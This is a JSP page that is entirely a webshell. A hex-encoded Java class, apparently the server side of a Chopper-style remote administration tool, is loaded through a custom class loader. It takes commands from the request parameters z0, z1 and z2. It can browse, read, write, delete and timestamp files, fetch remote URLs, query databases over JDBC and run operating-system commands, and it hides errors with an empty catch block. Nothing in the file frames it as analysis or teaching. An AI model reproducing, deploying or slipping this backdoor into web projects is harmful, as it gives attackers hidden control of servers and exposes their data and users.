<%@page import="java.io.*,java.lang.reflect.*" %><% try { String a="CAFEBABE00000032028A0A00C501540701550801560A000201570900C401580A000201590A0002015A08015B0A0002015C0A015D015E08015F0A000201600701610A000D01540A000D01620801630A000D01640801650A000201660801670A016801690B016A016B0A001B016C0A001B01640A0002016D0A0091016E07016F0A001B01700A001B01710701720801730A001E01700701740A001B01750A002101760A001E01770A001B01780801790A001B017A08017B0A001B017C0A001B017D08017E08017F0A001B01800A000D01810801820A001B01830A001B01840A00C401850701860701870A003401700A003301880801890A0002018A0A018B018C0A0033018D08018E0A018B018F0A0033018F0801900A001B01910701920A004001930A000201940A000201950A000201960A004001970A0040018F0A001B01980A001B019908019A0A00C4019B0A003401930A0034018D0A0040018C0A0034018F0A001B019C0A001E019D0A0021019E0A001B019F0701A00A005301700A004001700A005301A10701A20A005701A30A01A401A50A01A4018F0A005701A60701A70701A80A005D01880A005C01A90A005C01AA0A00C401AB0B016A01AC0B01AD01AE0B01AD01AF0B01B001B10B01B001B20B01B0018F0B016A018F0801B30801B40B01AD01B50801B60B01B001B70B016A01B80801B90B01BA01BB0B01B001BC0B01BD01BE0B01BD01BF0801C00B01BD01C10801C20B01BA018F0801C30801C40801C50701C60701C70A004001C80A007C01C90A007B01CA0B01B001CB0A000D01CC0A007B01CD0A007B01CE0A007B01CF0A007B018F0701D00801D10B01BA01D20801D30A008601640801D40901D501D60801D70801D80801D90A01DA01DB0701DC0A009101700900C401DD0A00C401DE0801DF0A000201E00A00C401E10801E20A00C401E30801E40A005C018F0801E50A007C01E60801E70801E80801E90A00C401EA0801EB0A00C401EC0801ED0800E60A00C401EE0800C70A00C401EF0801F00A00C401F10801F20A00C401F30801F40A000201F50A01F601F70A01F601F80A01F901A30A00C401FA0A01F901FB0801FC0A00C401FD0801FE0A00C401FF0802000A00C402010802020802030A000202040802050A00C402060802070A009101640A018B020808020908020A07020B07020C01001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650500000000000000010100035077640100124C6A6176612F6C616E672F537472696E673B01000263730100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100044C43683B0100024543010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100017301000A457863657074696F6E730100024743010029284C6A6176612F6C616E672F537472696E673B294C6A6176612F73716C2F436F6E6E656374696F6E3B010001630100154C6A6176612F73716C2F436F6E6E656374696F6E3B010001780100135B4C6A6176612F6C616E672F537472696E673B01000D537461636B4D61705461626C650701550700DE07020D010002414101001B284C6A6176612F6C616E672F537472696E674275666665723B2956010001690100014901000273620100184C6A6176612F6C616E672F537472696E674275666665723B0100017201000F5B4C6A6176612F696F2F46696C653B0700EA010002424201002D284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E674275666665723B29560100027354010002735101000264740100104C6A6176612F7574696C2F446174653B0100026F4601000E4C6A6176612F696F2F46696C653B0100016C0100027346010002666D01001C4C6A6176612F746578742F53696D706C6544617465466F726D61743B0701DC07016F0701720701740701610100024545010015284C6A6176612F6C616E672F537472696E673B29560100016B01000166010002464601002B284C6A6176612F6C616E672F537472696E673B4C6A6176612F696F2F4F757470757453747265616D3B29560100026F730100164C6A6176612F696F2F4F757470757453747265616D3B0100016E010001620100025B42010002697301001D4C6A6176612F696F2F4275666665726564496E70757453747265616D3B07010707018607020E0100024747010027284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B2956010001640100016801001A4C6A6176612F696F2F46696C654F757470757453747265616D3B07019201000248480100016A0100017A0100194C6A6176612F696F2F46696C65496E70757453747265616D3B0100027366010002646607018701000249490100024A4A0100024B4B010001740100024C4C0100017501000E4C6A6176612F6E65742F55524C3B01001C4C6A6176612F6E65742F4874747055524C436F6E6E656374696F6E3B0100154C6A6176612F696F2F496E70757453747265616D3B0701A00701A207020F0100024D4D010030284C6A6176612F696F2F496E70757453747265616D3B4C6A6176612F6C616E672F537472696E674275666665723B295601000262720100184C6A6176612F696F2F42756666657265645265616465723B0701A70100024E4E0100144C6A6176612F73716C2F526573756C745365743B0702100100024F4F07021101000250500100016D0100144C6A6176612F73716C2F53746174656D656E743B01001C4C6A6176612F73716C2F526573756C745365744D657461446174613B0702120702130100025151010063284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E674275666665723B4C6A6176612F6C616E672F537472696E673B295601000466696C6501000265650100154C6A6176612F6C616E672F457863657074696F6E3B01000165010001710100017001000262770100184C6A6176612F696F2F42756666657265645772697465723B0701C60702120701D00701D0010002676F010061284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F696F2F4F757470757453747265616D3B29560100134C6A6176612F6C616E672F50726F636573733B0100015A0100027A310100027A32010004636F64650100037A7A310100037A7A32010004706174680701550701DC0702140100083C636C696E69743E01000A536F7572636546696C6501000743682E6A6176610C00CE00CF0100106A6176612F6C616E672F537472696E6701000A49534F2D383835392D310C021502160C00CD00CC0C00CE02170C021802190100020D0A0C021A021B07021C0C021D021E01000B6A6462633A6F7261636C650C021F02200100176A6176612F6C616E672F537472696E674275696C6465720C022102220100013A0C022302190100075B2F6E756C6C5D0C022402250100000702260C0227022807020D0C022900FE0C022A022B0C022C022D0C0221022E01000C6A6176612F696F2F46696C650C00CE00FE0C022F022B01001A6A6176612F746578742F53696D706C6544617465466F726D6174010013797979792D4D4D2D64642048483A6D6D3A737301000E6A6176612F7574696C2F446174650C023002310C00CE02320C023302340C02350236010001520C0237023601000220570C023802360C023902190100022F09010001090C023A02310C0221023B0100010A0C023C02360C023D02190C00FD00FE01001B6A6176612F696F2F4275666665726564496E70757453747265616D0100176A6176612F696F2F46696C65496E70757453747265616D0C00CE023E0100032D3E7C0C0215023F07020E0C024002410C024202430100037C3C2D0C024400CF010010303132333435363738394142434445460C024502360100186A6176612F696F2F46696C654F757470757453747265616D0C00CE02460C023A02470C024802490C021F024A0C0240024B0C024C02360C024D02360100012F0C0113010E0C024E024F0C025002510C025202310C0253025401000C6A6176612F6E65742F55524C0C0255025601001A6A6176612F6E65742F4874747055524C436F6E6E656374696F6E0C0257025807020F0C024202590C025A00CF0100166A6176612F696F2F42756666657265645265616465720100196A6176612F696F2F496E70757453747265616D5265616465720C00CE025B0C025C02190C00D900DA0C025D025E0702110C025F02600C026102600702100C026202360C02630264010001250100055441424C450C0265026601000A5441424C455F4E414D450C026300D60C0267026801000E73656C656374202A2066726F6D200702120C0269026A0C025D026B0702130C026C02470C026D026401000220280C026E026401000229090100042D2D663A010003097C090100042D746F3A0100166A6176612F696F2F427566666572656457726974657201001A6A6176612F696F2F4F757470757453747265616D5772697465720C00CE026F0C00CE02700C00CE02710C027202730C022102740C024000FE0C027500CF0C027600CF0100136A6176612F6C616E672F457863657074696F6E01000B526573756C74097C090D0A0C0277022001001A45786563757465205375636365737366756C6C7921097C090D0A010005097C090D0A0702780C0279027A0100050A7A7A313A0100050A7A7A323A0100060A706168743A07027B0C027C00FE0100166A6176612F6C616E672F537472696E674275666665720C00CB00CC0C00D500D6010001410C027D027E0C00E300E4010001420C00EC00ED01000143010001440C00CE027F0100013101000145010001460C01010102010001470C010D010E010001480C011A010E0C011B00FE0100014B0C011C010E0100014C0C011E010E0100014D0C022C02640702800C028102820C028302840702850C012601270C028602580100014E0C012B00ED0100014F0C012E00ED010001500C013000ED010001510100025C5C0C02870288010007696D616765732F0C013601370100094552524F523A2F2F200C024002890100066F6F6F7878780100055554462D3801000243680100106A6176612F6C616E672F4F626A6563740100136A6176612F73716C2F436F6E6E656374696F6E0100146A6176612F696F2F4F757470757453747265616D0100136A6176612F696F2F496E70757453747265616D0100126A6176612F73716C2F526573756C745365740100196A6176612F73716C2F44617461626173654D657461446174610100126A6176612F73716C2F53746174656D656E7401001A6A6176612F73716C2F526573756C745365744D657461446174610100136A6176612F696F2F494F457863657074696F6E0100086765744279746573010016284C6A6176612F6C616E672F537472696E673B295B42010017285B424C6A6176612F6C616E672F537472696E673B29560100047472696D01001428294C6A6176612F6C616E672F537472696E673B01000573706C6974010027284C6A6176612F6C616E672F537472696E673B295B4C6A6176612F6C616E672F537472696E673B01000F6A6176612F6C616E672F436C617373010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B010007696E6465784F66010015284C6A6176612F6C616E672F537472696E673B2949010006617070656E6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275696C6465723B010008746F537472696E67010010657175616C7349676E6F726543617365010015284C6A6176612F6C616E672F537472696E673B295A0100166A6176612F73716C2F4472697665724D616E6167657201000D676574436F6E6E656374696F6E01004D284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B294C6A6176612F73716C2F436F6E6E656374696F6E3B01000A736574436174616C6F670100096C697374526F6F747301001128295B4C6A6176612F696F2F46696C653B010009737562737472696E67010016284949294C6A6176612F6C616E672F537472696E673B01002C284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E674275666665723B0100096C69737446696C657301000C6C6173744D6F64696669656401000328294A010004284A2956010006666F726D6174010024284C6A6176612F7574696C2F446174653B294C6A6176612F6C616E672F537472696E673B01000763616E5265616401000328295A01000863616E577269746501000B69734469726563746F72790100076765744E616D650100066C656E67746801001C284A294C6A6176612F6C616E672F537472696E674275696C6465723B01000664656C65746501000767657450617468010018284C6A6176612F696F2F496E70757453747265616D3B295601000428295B420100057772697465010007285B424949295601000472656164010007285B4249492949010005636C6F736501000D6372656174654E657746696C65010011284C6A6176612F696F2F46696C653B29560100032829490100066368617241740100042849294301000428492949010004284929560100066578697374730100056D6B64697201000872656E616D65546F010011284C6A6176612F696F2F46696C653B295A0100057061727365010024284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F446174653B01000767657454696D6501000F7365744C6173744D6F646966696564010004284A295A01000E6F70656E436F6E6E656374696F6E01001A28294C6A6176612F6E65742F55524C436F6E6E656374696F6E3B01000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010005285B42294901000A646973636F6E6E656374010013284C6A6176612F696F2F5265616465723B2956010008726561644C696E6501000B6765744D6574614461746101001D28294C6A6176612F73716C2F44617461626173654D657461446174613B01000A676574536368656D617301001628294C6A6176612F73716C2F526573756C745365743B01000B676574436174616C6F67730100046E657874010009676574537472696E670100152849294C6A6176612F6C616E672F537472696E673B0100096765745461626C657301005F284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F537472696E673B294C6A6176612F73716C2F526573756C745365743B01000F63726561746553746174656D656E74010018284949294C6A6176612F73716C2F53746174656D656E743B01000C657865637574655175657279010028284C6A6176612F6C616E672F537472696E673B294C6A6176612F73716C2F526573756C745365743B01001E28294C6A6176612F73716C2F526573756C745365744D657461446174613B01000E676574436F6C756D6E436F756E7401000D676574436F6C756D6E4E616D65010011676574436F6C756D6E547970654E616D65010012284C6A6176612F696F2F46696C653B5A295601002B284C6A6176612F696F2F4F757470757453747265616D3B4C6A6176612F6C616E672F537472696E673B2956010013284C6A6176612F696F2F5772697465723B29560100096765744F626A6563740100152849294C6A6176612F6C616E672F4F626A6563743B01002D284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F537472696E674275696C6465723B010005666C7573680100076E65774C696E6501000D657865637574655570646174650100106A6176612F6C616E672F53797374656D0100036F75740100154C6A6176612F696F2F5072696E7453747265616D3B0100136A6176612F696F2F5072696E7453747265616D0100077072696E746C6E010006657175616C73010015284C6A6176612F6C616E672F4F626A6563743B295A010019284C6A6176612F696F2F4F757470757453747265616D3B29560100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E6765744572726F7253747265616D01000A7265706C616365416C6C010038284C6A6176612F6C616E672F537472696E673B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B010005285B422956002100C400C500000003001A00C600C7000100C80000000200C9000900CB00CC0000000900CD00CC00000014000100CE00CF000100D00000002F00010001000000052AB70001B10000000200D10000000600010000001A00D20000000C00010000000500D300D40000000800D500D6000200D00000003B0004000100000011BB0002592A1203B60004B20005B70006B00000000200D10000000600010000002200D20000000C00010000001100D700CC000000D80000000400010086000800D900DA000200D00000019E00040003000000A92AB600071208B600094C2B0332B60007B8000A572B0432120BB6000C029F004BBB000D59B7000E2B0432B60007B6000F1210B6000F2B0732B6000FB600112B05321212B600139900081214A700062B05322B06321212B600139900081214A700062B0632B80015B02B0432B600072B05321212B600139900081214A700062B05322B06321212B600139900081214A700062B0632B800154D2BBE07A4000C2C2B0732B9001602002CB00000000300D100000022000800000026000A002700140028002000290068002B0098002C009E002D00A7002F00D20000002000030098001100DB00DC0002000000A900D700CC0000000A009F00DD00DE000100DF00000095000AFF004E00020700E00700E100010700E0FF000200020700E00700E100020700E00700E0FF000F00020700E00700E100020700E00700E0FF000200020700E00700E100030700E00700E00700E003550700E0FF000200020700E00700E100020700E00700E0FF000F00020700E00700E100020700E00700E0FF000200020700E00700E100030700E00700E00700E0FC00120700E200D80000000400010086000800E300E4000200D0000000830004000300000023B800174C033D1C2BBEA200192A2B1C32B600180305B60019B6001A57840201A7FFE7B10000000300D10000001600050000003400040035000C0036001C00350022003800D20000002000030006001C00E500E600020000002300E700E800000004001F00E900EA000100DF0000000C0002FD00060700EB01FA001B00D80000000400010086000800EC00ED000200D00000028A0004000A00000117BB001B592AB7001C4D2CB6001D4E12143A06BB001E59121FB700203A0803360915092DBEA200EBBB0021592D150932B60022B700233A0719081907B600243A042D150932B600259900081226A7000512143A05BB000D59B7000E1905B6000F2D150932B600279900081228A700051214B6000FB600113A052D150932B600299900472BBB000D59B7000E2D150932B6002AB6000F122BB6000F1904B6000F122CB6000F2D150932B6002DB6002E122CB6000F1905B6000F122FB6000FB60011B6001A57A70046BB000D59B7000E1906B6000F2D150932B6002AB6000F122CB6000F1904B6000F122CB6000F2D150932B6002DB6002E122CB6000F1905B6000F122FB6000FB600113A06840901A7FF142B1906B6001A57B10000000300D10000003A000E0000003B000E003C0012003E001D003F00270040003700410040004200530043007800440082004500C600470109003F010F004A0116004B00D200000066000A004000CF00EE00CC0004005300BC00EF00CC0005003700D800F000F10007002000EF00E500E600090000011700D700CC00000000011700E700E800010009010E00F200F30002000E010900F400EA00030012010500F500CC0006001D00FA00F600F7000800DF000000B50008FF0020000A0700E00700F80700F90700EB00000700E0000700FA010000FF002E000A0700E00700F80700F90700EB0700E0000700E00700FB0700FA010000410700E0FF001C000A0700E00700F80700F90700EB0700E00700E00700E00700FB0700FA0100010700FCFF0001000A0700E00700F80700F90700EB0700E00700E00700E00700FB0700FA0100020700FC0700E0FB0055FB0042FF000500090700E00700F80700F90700EB00000700E0000700FA000000D80000000400010086000800FD00FE000200D0000000B9000300040000003BBB001B592AB7001C4C2BB600299900282BB6001D4D033E1D2CBEA2001B2C1D32B600309A000C2C1D32B60031B80032840301A7FFE52BB6003057B10000000300D10000002600090000004E0009004F0010005000150051001D005200260053002F005100350057003A005800D20000002A00040017001E00FF00E600030015002000DD00EA00020000003B00D700CC000000090032010000F3000100DF000000100003FE00170700F90700EB0117F9000500D80000000400010086000801010102000200D0000000E90005000500000051110200BC084EBB003359BB0034592AB70035B700363A042B1237B600380306B6003919042D03110200B6003A593D029F000D2B2D031CB60039A7FFE92B123BB600380306B600392BB6003C1904B6003DB10000000300D10000002600090000005C0006005D0017005E0022005F00320060003C006200470063004B00640050006500D20000003400050000005100D700CC000000000051010301040001002E0023010500E600020006004B0106010700030017003A01080109000400DF000000200002FE00220007010A07010BFF001900050700E007010C0107010A07010B000000D800000004000100860008010D010E000200D0000000EF0006000600000051123E4DBB001B592AB7001C4E2DB6003F57BB0040592DB700413A0403360515052BB60042A2002719042C2B1505B60043B6004407782C2B15050460B60043B6004480B60045840502A7FFD61904B60046B10000000300D10000002600090000006800030069000C006A0011006B001B006C0027006D0045006C004B006F0050007000D20000003E0006001E002D00E500E600050000005100D700CC000000000051010F00CC00010003004E011000CC0002000C0045010000F30003001B003601030111000400DF0000001C0002FF001E00060700E00700E00700E00700F9070112010000FA002C00D8000000040001008600080113010E000200D0000001F000040008000000C3BB001B592AB7001C4DBB001B592BB7001C4E2CB600299900682DB600479A00082DB60048572CB6001D3A0403360515051904BEA20048BB000D59B7000E2AB6000F1249B6000F1904150532B6002AB6000FB60011BB000D59B7000E2BB6000F1249B6000F1904150532B6002AB6000FB60011B8004A840501A7FFB6A70047BB0034592CB7004B3A04BB0040592DB700413A05110200BC083A071904190703110200B6004C593606029F001019051907031506B6004DA7FFE41904B6004E1905B60046B10000000300D10000004600110000007300120074001900750020007600250078002B00790036007A00750079007B007C007E007D0088007E009200800099008100AB008200B8008400BD008500C2008700D200000066000A002E004D011400E60005002B0050011500EA00040088003A0108011600040092003001030111000500A7001B010500E6000600990029010601070007000000C300D700CC0000000000C3010F00CC0001000900BA011700F30002001200B1011800F3000300DF000000630007FD00250700F90700F9FD00080700EB01F9004C02FF001A00080700E00700E00700F90700F90701190701120007010A0000FF001E00080700E00700E00700F90700F90701190701120107010A0000FF000900040700E00700E00700F90700F9000000D800000004000100860008011A010E000200D0000000690003000400000019BB001B592AB7001C4DBB001B592BB7001C4E2C2DB6004F57B10000000200D10000000E00030000008A0012008B0018008C00D20000002A00040000001900D700CC000000000019010F00CC000100090010011700F3000200120007011800F3000300D800000004000100860008011B00FE000200D00000004B000300020000000FBB001B592AB7001C4C2BB6004857B10000000200D10000000E00030000008F00090090000E009100D20000001600020000000F00D700CC000000090006010000F3000100D800000004000100860008011C010E000200D0000000870003000500000025BB001B592AB7001C4DBB001E59121FB700204E2D2BB600503A042C1904B60051B6005257B10000000200D1000000160005000000940009009500130096001A00970024009800D20000003400050000002500D700CC000000000025011D00CC00010009001C010000F300020013001200F600F70003001A000B00F000F1000400D800000004000100860008011E010E000200D0000001170004000800000055BB0053592AB700544D033EBB0040592BB700553A042CB60056C000573A051905B600583A06110200BC083A0719061907B60059593E029F000F19041907031DB6004DA7FFEA1904B600461906B6005A1905B6005BB10000000300D100000032000C0000009B0009009C000B009D0015009E001E009F002500A0002C00A1003900A2004500A4004A00A5004F00A6005400A700D20000005200080000005500D700CC000000000055010F00CC00010009004C011F01200002000B004A010500E6000300150040010301110004001E003701100121000500250030010801220006002C002901060107000700DF000000200002FF002C00080700E00700E00701230107011207012407012507010A00001800D80000000400010086000801260127000200D0000000AB0005000400000035BB005C59BB005D592AB7005EB7005F4E2DB60060594DC6001E2BBB000D59B7000E2CB6000F1208B6000FB60011B6001A57A7FFDFB10000000300D1000000120004000000AB001000AC001900AD003400AF00D20000002A0004000000350108012200000000003500E700E800010016001F00F400CC00020010002501280129000300DF0000001C0002FD00100007012AFF002300040701250700F80700E007012A000000D800000004000100860008012B00ED000200D0000000D900040004000000602AB800614D2A120BB6000C029F00112CB900620100B900630100A7000E2CB900620100B9006401004E2DB9006501009900242BBB000D59B7000E2D04B900660200B6000F122CB6000FB60011B6001A57A7FFD92DB9006701002CB900680100B10000000300D10000001E0007000000B2000500B3002900B4003200B5005300B7005900B8005F00B900D20000002A00040000006000D700CC00000000006000E700E800010005005B00DB00DC00020029003700E9012C000300DF000000130004FC001D0700E24A07012DFC000007012D2900D800000004000100860008012E00ED000200D00000014500080005000000802AB800614D2AB600071208B600094E2CB900620100012A120BB6000C029F00152DBE08A400092D0832A7000A2D0732A7000401126904BD00025903126A53B9006B05003A041904B9006501009900262BBB000D59B7000E1904126CB9006D0200B6000F122CB6000FB60011B6001A57A7FFD61904B9006701002CB900680100B10000000300D1000000220008000000BC000500BD000F00BE004500BF004F00C0007200C2007900C3007F00C400D20000003400050000008000D700CC00000000008000E700E800010005007B00DB00DC0002000F007100DD00DE00030045003B00E9012C000400DF000000510005FF002C00040700E00700F80700E20700E1000207012F05FF000500040700E00700F80700E20700E1000207012F05FF000000040700E00700F80700E20700E1000307012F050700E0FC001107012D2C00D800000004000100860008013000ED000200D00000016600050008000000A22AB600071208B600094D2AB800614E2D1103ED1103EFB9006E03003A041904BB000D59B7000E126FB6000F2C2CBE046432B6000FB60011B9007002003A051905B9007101003A0604360715071906B900720100A3003A2BBB000D59B7000E19061507B900730200B6000F1274B6000F19061507B900750200B6000F1276B6000FB60011B6001A57840701A7FFC01905B9006701001904B9007701002DB900680100B10000000300D100000032000C000000C7000A00C8000F00C9001D00CA003E00CB004700CC005600CD008700CC008D00CF009400D0009B00D100A100D200D2000000520008004A004300E500E60007000000A200D700CC0000000000A200E700E80001000A009800DD00DE0002000F009300DB00DC0003001D0085013101320004003E006400E9012C00050047005B010F0133000600DF000000220002FF004A00080700E00700F80700E10700E207013407012D070135010000FA004200D80000000400010086000801360137000200D000000487000C000C000001E62BB800613A0519051103ED1103F0B9006E03003A06013A0719062C1278B6000C029F00112C032C1278B6000CB60019A700042CB9007002003A081908B9007101003A091909B900720100360A04360B150B150AA300292DBB000D59B7000E1909150BB900730200B6000F1279B6000FB60011B6001A57840B01A7FFD62D1208B6001A572C1278B6000C029F0075BB001B591904B7001C3A0B2C127AB6000C02A00009190BB6004857BB007B59BB007C59BB004059BB001B592C127AB6000C029F000B1904B60007A70028BB000D59B7000E1904B6000F2C2C1278B6000C07602CB60042B60019B60007B6000FB60011B7001C04B7007D2AB7007EB7007F3A071908B90065010099008304360B150B150AA300652C1278B6000C029F00301907BB000D59B7000E1908150BB900800200B600811214B6000F122CB6000FB60011B600821907B60083A700282DBB000D59B7000E1908150BB900800200B600811214B6000F1279B6000FB60011B6001A57840B01A7FF9A1907C600081907B600842D1208B6001A57A7FF791908B9006701001907C600081907B60085A7003D3A082D1287B6001A5719062CB900880200572D1289B6001A57A700213A092DBB000D59B7000E1909B6008AB6000F128BB6000FB60011B6001A571906B9007701001905B900680100B100020018019A019D008601A601B601B90086000300D1000000960025000000D5000600D6001500D7001800D9003A00DA004300DB004C00DC005600DD007600DC007C00DF008300E0008D00E1009800E200A200E300A800E500FF00E7010900E8011300E9011D00EA014200EB014A00ED016F00E8017500F0017F00F1018900F3019000F4019A00FD019D00F5019F00F601A600F801AF00F901B600FC01B900FA01BB00FB01D700FE01DE00FF01E5010000D2000000A20010004F002D00E500E6000B00980067013800F3000B010C006900E500E6000B003A016000E9012C000800430157010F01330009004C014E010500E6000A01BB001C0139013A0009019F0038013B013A0008000001E600CD00CC0000000001E600D700CC0001000001E6013C00CC0002000001E600E700E80003000001E6013D00CC0004000601E000DB00DC0005001501D1013101320006001801CE013E013F000700DF0000013B0012FF003200080700E00700E00700E00700F80700E00700E20701340701400001070141FF000000080700E00700E00700E00700F80700E00700E207013407014000020701410700E0FF001B000C0700E00700E00700E00700F80700E00700E207013407014007012D07013501010000FA002CFC002B0700F9FF0021000C0700E00700E00700E00700F80700E00700E207013407014007012D070135010700F900080800A80800A80800AC0800AC0800B00800B00800B40800B4FF0024000C0700E00700E00700E00700F80700E00700E207013407014007012D070135010700F900090800A80800A80800AC0800AC0800B00800B00800B40800B40700E0FA000FFC000C013D24FA00050909F8001042070142FF001B00090700E00700E00700E00700F80700E00700E20701340701400701430001070142FA001D00D80000000400010086000901440145000200D0000006210009000C00000371B2008CBB000D59B7000E2AB6000F128DB6000F2BB6000F128EB6000F2CB6000F1214B6000F128FB6000F2DB6000FB60011B600902AC600072AA70006B20005B30005BB0091591214B700923A05BB000D59B7000EB20093B6000F1214B6000FB60011B800943A06BB000D59B7000E2BB6000F1214B6000FB60011B800943A07BB000D59B7000E2CB6000F1214B6000FB60011B800943A0819051237B6001A572D3A0919061295B600969900341905BB000D59B7000E1909B6000F122CB6000FB60011B6001A5719090304B600191249B600969A02671905B80097A7025F19061298B6009699000D19071905B80099A7024B1906129AB6009699005712143A0ABB005C59BB005D59BB003459BB001B591907B7001CB7004BB7005EB7005F3A0B190BB60060593A0AC600201905BB000D59B7000E190AB6000F1208B6000FB60011B6001A57A7FFDB190BB6009BA701ED1906129CB6009699003ABB007B59BB007C59BB004059BB001B591907B7001CB70041B7009DB7007F3A0A190A1908B60082190AB600851905129EB6001A57A701AC1906129FB600969900131907B800321905129EB6001A57A70192190612A0B6009699000B19071904B800A1B1190612A2B6009699001519071908B800A31905129EB6001A57A70164190612A4B6009699001519071908B8004A1905129EB6001A57A70148190612A5B6009699001519071908B800A61905129EB6001A57A7012C190612A7B600969900131907B800A81905129EB6001A57A70112190612A9B6009699001519071908B800AA1905129EB6001A57A700F6190612ABB6009699001519071908B800AC1905129EB6001A57A700DA190612ADB6009699004206BD00025903190705B600AE53590419070305B600195359051908533A0AB800AF190AB600B03A0B190BB600B11905B800B2190BB600B31905B800B2A70091190612B4B6009699000D19071905B800B5A7007D190612B6B6009699000D19071905B800B7A70069190612B8B6009699000D19071905B800B9A70055190612BAB6009699004BB200051907190819051908127AB6000C029F001919081908127AB6000C07601908B60042B60019A7001EBB000D59B7000E190912BB1249B600BCB6000F12BDB6000FB60011B800BEA700223A061905BB000D59B7000E12BFB6000F1906B6008AB6000FB60011B6001A571905123BB6001A5719041905B600C0B60038B600C1B10002004D01BB033C008601BC0339033C0086000300D100000112004400000106003401070042010B004D010D0067010E007F010F00970110009F011100A2011200AC011300C6011400D5011500DD011700E7011800F1011900FB011A00FF011B011F011C012A011D0147011F014C012001590121017901220180012301850124018D0125019A0126019F012701AA012801B4012901BB012A01BC012B01C6012C01CD012D01D8012E01E2012F01E9013001F4013101FE01320205013302100134021A0135021F0136022A013702340138023B01390246013A0250013B0257013C0262013D026C013E028A013F02940140029E014102A8014202B5014302BF014402C9014502D3014602DD014702E7014802F101490339014D033C014B033E014C035B014F036301500370015200D2000000A2001000FF004D00F400CC000A011F002D01280129000B01790014013E013F000A028A001E00DB00DE000A02940014013D0146000B006702D2014700CC0006007F02BA014800CC0007009702A2014900CC000800A2029700D700CC0009033E001D013B013A000600000371014A00CC000000000371014B00CC000100000371014C00CC000200000371014D00CC000300000371010301040004004D032400E700E8000500DF000000CE00193C420700E0FF009D000A0700E00700E00700E00700E007010C0700F80700E00700E00700E00700E0000013FD002D0700E007012A27F90007FB004019111B1B1B191B1BFB0048131313FF0033000A0700E00700E00700E00700E007010C0700F80700E00700E00700E00700E000040700E007014E07014E07014FFF001A000A0700E00700E00700E00700E007010C0700F80700E00700E00700E00700E000050700E007014E07014E07014F0700E0FF000200060700E00700E00700E00700E007010C0700F80000420701421E00D800000004000101500008015100CF000100D000000027000100000000000B12C2B3009312C3B30005B10000000100D10000000A00020000001E0005001F00010152000000020153"; byte[] bytes=hex2byte(a.getBytes() ); MyClassLoader loader=new MyClassLoader(); loader.setData(bytes); Class c=loader.findClass("Ch"); String cs=request.getParameter("z0"); response.setContentType("text/html"); response.setCharacterEncoding(cs); String zz1=request.getParameter("z1"); String zz2=request.getParameter("z2"); String realpath=request.getSession().getServletContext().getRealPath("/"); Method go=c.getMethod("go", new Class[]{String.class ,String.class,String.class,String.class,OutputStream.class } ); go.invoke(null,new Object[]{cs, zz1, zz2, realpath,response.getOutputStream()}); } catch (Exception e) { }%><%! class MyClassLoader extends ClassLoader { private byte[] data ; public void setData(byte[] data){ this.data = data; } public Class findClass(String name) { Class result = null; try { return findSystemClass(name); } catch (Exception e) { } byte[] b = data; result = defineClass(name, b, 0, b.length,null); return result; } } public static byte[] hex2byte(byte[] b) { if ((b.length % 2) != 0) { throw new IllegalArgumentException("long error"); } byte[] b2 = new byte[b.length / 2]; for (int n = 0; n < b.length; n += 2) { String item=new String(b, n, 2); b2[n / 2] = (byte) Integer.parseInt(item, 16); } b=null; return b2; }%>